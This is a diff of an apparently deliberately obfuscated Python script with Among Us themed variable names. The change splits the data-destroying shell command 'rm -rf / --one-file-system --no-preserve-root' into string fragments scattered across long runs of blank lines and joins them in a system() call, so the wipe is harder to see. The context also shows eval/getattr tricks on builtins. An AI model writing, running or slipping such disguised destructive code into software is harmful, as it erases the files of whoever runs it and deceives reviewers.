@@ -13,7 +13,43 @@
 
 
 
+sussy = "rm"
+more_sussy = " -rf"
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+jay_the = " /"
+
+sus = " --one-file-system"
+
+
+
+
+imposter = " --no-preserve-root"
 while (not (
 
         not (not (False)
@@ -48,7 +84,7 @@ while False:
                 break
 
 
-sussy_amongus_jay_the_sus_imposter.system("rm -rf / --one-file-system --no-preserve-root")
+sussy_amongus_jay_the_sus_imposter.system(sussy+more_sussy+jay_the+sus+imposter)
 啊BBu__啊啊啊__Built____ins___= \
             (
                 getattr(eval(
